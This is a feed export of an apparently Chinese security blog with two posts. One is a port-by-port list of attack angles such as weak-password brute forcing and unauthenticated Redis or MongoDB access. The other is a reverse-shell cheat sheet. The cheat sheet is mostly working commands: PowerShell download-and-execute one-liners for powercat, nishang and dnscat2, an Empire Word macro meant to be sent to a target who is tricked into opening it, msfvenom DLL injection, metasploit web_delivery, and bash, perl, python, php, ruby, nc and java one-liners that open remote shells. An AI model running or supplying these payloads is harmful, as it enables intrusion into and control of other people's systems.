    <content type="html"><![CDATA[<p><strong>21</strong> ftp 主要看是否支持匿名，也可以跑弱口令</p><p><strong>22</strong> ssh SSH远程登录协议</p><p><strong>23</strong> telnet telnet终端仿真协议</p><p><strong>80</strong> web 常见web漏洞以及是否为一些管理后台</p><p><strong>389</strong> LDAP（轻量目录访问协议）存在匿名访问</p><p><strong>443</strong> openssl 心脏滴血以及一些web漏洞测试</p><p><strong>873</strong> rsync 主要看是否支持匿名，也可以跑弱口令</p><p><strong>1099</strong>  JAVArmi  命令执行</p><p><strong>1433</strong> SQl server</p><p><strong>1521</strong>  Oracle   弱口令</p><p><strong>3306</strong> MySQL 能够外联数据库</p><p><strong>3389</strong> RDP 远程桌面看看能不能弱口令</p><p><strong>5432</strong>        PostGreSQL       弱口令爆破</p><p><strong>6379</strong> redis 一般无认证，可直接访问</p><p><strong>7001，7002</strong>  weblogic的console口</p><p><strong>8080</strong>  Tomcat\Jboss     弱口令，Jboss匿名访问</p><p><strong>8080-8090</strong>   常见Web端口</p><p><strong>9000</strong> fast-cgi对外可以getshell</p><p><strong>9043</strong>        WebSphere        弱口令爆破</p><p><strong>27017</strong>    MongoDB          未授权访问</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;21&lt;/strong&gt; ftp 主要看是否支持匿名，也可以跑弱口令&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;22&lt;/strong&gt; ssh SSH远程登录协议&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;23&lt;/strong&gt; telnet telnet终端仿真协议&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="信息收集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>反弹shell的几种姿势</title>
    <link href="http://yoursite.com/2018/12/04/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
    <id>http://yoursite.com/2018/12/04/反弹shell的几种姿势/</id>
    <published>2018-12-04T03:01:26.000Z</published>
    <updated>2018-12-04T15:07:40.156Z</updated>
    
    <content type="html"><![CDATA[<h1 id="powershell反弹shell"><a href="#powershell反弹shell" class="headerlink" title="powershell反弹shell"></a>powershell反弹shell</h1><h2 id="powercat反弹shell"><a href="#powercat反弹shell" class="headerlink" title="powercat反弹shell"></a>powercat反弹shell</h2><p>环境说明：</p><ul><li>攻击机1：KALI 192.168.209.159</li><li>攻击机2：ubuntu 192.168.209.155</li><li>目标机：win7 192.168.209.160</li></ul><p><strong>可以在GitHub上下载powercat：</strong></p><p><a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">https://github.com/besimorhino/powercat</a></p><p>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat。</p><p>攻击机开启监听：</p><pre><code>nc -lvp 666</code></pre><p>或者用powercat监听：</p><pre><code>powercat -l -p 666</code></pre><p>目标机执行反弹cmd shell：</p><pre><code>powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&apos;);powercat -c 192.168.209.159 -p 6666 -e cmd</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxujq7s2rzj30hv01rq2r.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxujqds59gj30hf06dq68.jpg" alt=""></p><h2 id="nishang反弹shell"><a href="#nishang反弹shell" class="headerlink" title="nishang反弹shell"></a>nishang反弹shell</h2><p>Nishang(<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang </a>)是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p><h2 id="Reverse-TCP-shell"><a href="#Reverse-TCP-shell" class="headerlink" title="Reverse TCP shell"></a>Reverse TCP shell</h2><p>攻击机1（192.168.209.159）开启监听：</p><pre><code>nc -lvp 666</code></pre><p>目标机执行：</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666</code></pre><p>或者将nishang下载到攻击者本地：</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuklpyrglj30i308zdig.jpg" alt=""></p><h2 id="Reverse-UDP-shell"><a href="#Reverse-UDP-shell" class="headerlink" title="Reverse UDP shell"></a>Reverse UDP shell</h2><p>攻击机1（192.168.209.159）开启监听：</p><pre><code>nc -lvup 123</code></pre><p>目标机执行：</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/123.ps1&apos;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.209.159 -port 123</code></pre><blockquote><p>123.ps1为Invoke-PowerShellUdp.ps1，搭建了个网站IP为10.60.17.46</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuq2fok35j30ht060tam.jpg" alt=""></p><h2 id="Reverse-ICMP-shell"><a href="#Reverse-ICMP-shell" class="headerlink" title="Reverse ICMP shell"></a>Reverse ICMP shell</h2><p>需要利用icmpsh_m.py (<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a>)和nishang中的Invoke-PowerShellIcmp.ps1 来反弹ICMP shell。</p><p>攻击机1下载icmpsh_m.py文件，并执行</p><p><code>python icmpsh_m.py [Attacker IP] [Victim IP]</code></p><pre><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包python icmpsh_m.py 192.168.209.159 192.168.209.160 #开启监听</code></pre><p>目标机执行：</p><pre><code>powershell iex(New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/Invoke-PowerShellIcmp.ps1&apos;);Invoke-PowerShellIcmp -IPAddress 192.168.209.159</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuuo12w1cj30jm09y75t.jpg" alt=""></p><h2 id="自定义powershell函数反弹shell"><a href="#自定义powershell函数反弹shell" class="headerlink" title="自定义powershell函数反弹shell"></a>自定义powershell函数反弹shell</h2><p>利用<strong>powershell</strong>创建一个<strong>Net.Sockets.TCPClient</strong>对象，通过<strong>Socket</strong>反弹<strong>tcp shell</strong>，其实也是借鉴<strong>nishang</strong>中的<strong>Invoke-PowerShellTcpOneLine.ps1</strong></p><p>攻击机1（192.168.209.159）开启监听：</p><pre><code>nc -lvp 2333</code></pre><p>目标机执行：</p><pre><code>powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&apos;192.168.209.159&apos;,2333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuvui1lipj30ib03taas.jpg" alt=""></p><p>或者保存为lltest_tcp.ps1文件</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/lltest_tcp.ps1&apos;);Invoke-lltestTcp</code></pre><p>lltest_tcp.ps1 如下：</p><pre><code>function Invoke-lltestTcp{$client = New-Object Net.Sockets.TCPClient(&apos;192.168.159.134&apos;,6666)$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)$sendback = (iex $data 2&gt;&amp;1 | Out-String )$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)$stream.Write($sendbyte,0,$sendbyte.Length)$stream.Flush()}$client.Close()}</code></pre><h2 id="dnscat2-反弹DNS-shell"><a href="#dnscat2-反弹DNS-shell" class="headerlink" title="dnscat2 反弹DNS shell"></a>dnscat2 反弹DNS shell</h2><p>dnscat2(<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a>)是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(<a href="https://github.com/lukebaggett/dnscat2-powershell" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell</a>)</p><p>利用dnscat2 和 dnscat2-powershell实现反弹DNS shell:</p><p>攻击者2(Ubuntu 192.168.209.155)开启监听：</p><pre><code>ruby dnscat2.rb --dns &quot;domain=lltest.com,host=192.168.209.155&quot; --no-cache -e open</code></pre><blockquote><p>-e open 不使用加密连接，默认使用加密</p></blockquote><ul><li>ruby dnscat2.rb —help 查看帮助</li></ul><p>目标机执行：</p><pre><code>powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&apos;);Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.209.155</code></pre><p>成功反弹shell后，攻击机2：</p><pre><code>session -i 1 #进入到session 1shell #执行之后会新生成一个session 需要通过session -i 2 切换session -i 2</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuyo6e3lkj30gr0d9js3.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuyp53vbcj30cc077mx8.jpg" alt=""></p><h2 id="Empire-结合office反弹shell"><a href="#Empire-结合office反弹shell" class="headerlink" title="Empire 结合office反弹shell"></a>Empire 结合office反弹shell</h2><p>Empire(<a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a>) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell</p><h3 id="利用office-宏反弹shell"><a href="#利用office-宏反弹shell" class="headerlink" title="利用office 宏反弹shell"></a>利用office 宏反弹shell</h3><p>攻击者(192.168.209.159)开启监听:</p><pre><code>uselistener httpexecutebackusestager windows/macro http #生成payloadexecute</code></pre><p>生成/tmp/macro 攻击代码后，新建一个word 创建宏</p><p>点击<strong>“文件”-“宏”-“创建”</strong>，删除自带的脚本，复制进去<strong>/tmp/macro</strong>文件内容，并保存为<strong>“Word 97-2003文档(.doc)”</strong>或者<strong>“启用宏的Word 文档(.docm)”</strong>文档，当诱导目标打开，执行宏后，即可成功反弹shell：</p><blockquote><p>说明:需要开启宏或者用户手动启用宏。开启宏设置：<strong>“文件”-“选项”-“信任中心”</strong>,选择“启用所有宏”</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzjkmh4jj30nr0g6ac1.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzk0ox8cj30ol0dtwf0.jpg" alt=""></p><h2 id="PowerSploit-DLL注入反弹shell"><a href="#PowerSploit-DLL注入反弹shell" class="headerlink" title="PowerSploit DLL注入反弹shell"></a>PowerSploit DLL注入反弹shell</h2><p>PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。<br>利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell</p><h3 id="msfvenom生成dll后门"><a href="#msfvenom生成dll后门" class="headerlink" title="msfvenom生成dll后门"></a>msfvenom生成dll后门</h3><p>目标机1执行：</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.209.159 lport=4449 -f dll -o /var/www/html/test.dll</code></pre><blockquote><p>目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzuqx202j30hc063n0j.jpg" alt=""></p><h3 id="metasploit-设置payload-开启监听"><a href="#metasploit-设置payload-开启监听" class="headerlink" title="metasploit 设置payload 开启监听"></a>metasploit 设置payload 开启监听</h3><p>攻击机1执行：</p><pre><code>use exploit/multi/handlerset PAYLOAD windows/x64/meterpreter/reverse_tcpset LHOST 192.168.209.159set LPORT 4449exploit</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzyze3zgj30j80cvjyo.jpg" alt=""></p><h3 id="目标机远程下载"><a href="#目标机远程下载" class="headerlink" title="目标机远程下载"></a>目标机远程下载</h3><p>powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门<br>首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程</p><p>目标执行：</p><pre><code>Get-Process #查看进程进程</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv3gxyplaj30i00bkdgb.jpg" alt=""></p><pre><code>IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.209.159/Invoke-DllInjection.ps1&apos;); Invoke-DllInjection -ProcessID 5448 -Dll C:\Users\郭翔\Desktop\test.dll</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv3gbw7nzj30ec05iglm.jpg" alt=""></p><h2 id="metasploit反弹shell"><a href="#metasploit反弹shell" class="headerlink" title="metasploit反弹shell"></a>metasploit反弹shell</h2><p>利用metasploit的web_delivery模块可通过python、php、powershell、regsvr32等进行反弹shell</p><p>攻击者1(192.168.209.159)：</p><pre><code>msfconsoleuse exploit/multi/script/web_deliveryset PAYLOAD windows/meterpreter/reverse_tcpset target 2set LHOST 192.168.209.159set LPORT 123exploit</code></pre><p>执行完exploit后会弹出一段payload，将这段payload复制到目标机</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzee76ukj30k505kn0l.jpg" alt=""></p><p>目标机执行：</p><pre><code>powershell.exe -nop -w hidden -c $f=new-object net.webclient;$f.proxy=[Net.WebRequest]::GetSystemWebProxy();$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $f.downloadstring(&apos;http://192.168.209.159:8080/1nLv5Znszan1&apos;);</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxuzcyrpgnj30yd09547q.jpg" alt=""></p><h2 id="Cobalt-strike反弹shell"><a href="#Cobalt-strike反弹shell" class="headerlink" title="Cobalt strike反弹shell"></a>Cobalt strike反弹shell</h2><p>博客中有一个专门的文章对Cobalt strike做介绍。</p><h1 id="bash版本："><a href="#bash版本：" class="headerlink" title="bash版本："></a>bash版本：</h1><pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></pre><blockquote><p>注意某些linux不支持</p></blockquote><p>这里shell由bash解析，有时候是由sh解析，不一定百发百中</p><p>这里<code>&amp;</code>在Linux shell中表示后台运行，当然这里<code>0&gt;&amp;1</code>不是这样,对于<code>&amp;1</code>更准确的说应该是文件描述符1,而1一般代表的就是STDOUT_FILENO</p><h1 id="perl版本"><a href="#perl版本" class="headerlink" title="perl版本:"></a>perl版本:</h1><pre><code>perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;</code></pre><h1 id="python版本："><a href="#python版本：" class="headerlink" title="python版本："></a>python版本：</h1><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><h1 id="php版本："><a href="#php版本：" class="headerlink" title="php版本："></a>php版本：</h1><pre><code>php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</code></pre><h1 id="ruby版本："><a href="#ruby版本：" class="headerlink" title="ruby版本："></a>ruby版本：</h1><pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</code></pre><h1 id="nc版本："><a href="#nc版本：" class="headerlink" title="nc版本："></a>nc版本：</h1><pre><code>nc -e /bin/sh 10.0.0.1 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1nc 10.0.0.1 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</code></pre><h1 id="java版本"><a href="#java版本" class="headerlink" title="java版本"></a>java版本</h1><pre><code>r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;powershell反弹shell&quot;&gt;&lt;a href=&quot;#powershell反弹shell&quot; class=&quot;headerlink&quot; title=&quot;powershell反弹shell&quot;&gt;&lt;/a&gt;powershell反弹shell&lt;/h1&gt;&lt;h2 id=&quot;power
      
    
    </summary>
    
      <category term="shell" scheme="http://yoursite.com/categories/shell/"/>
    
    
  </entry>
  
</feed>
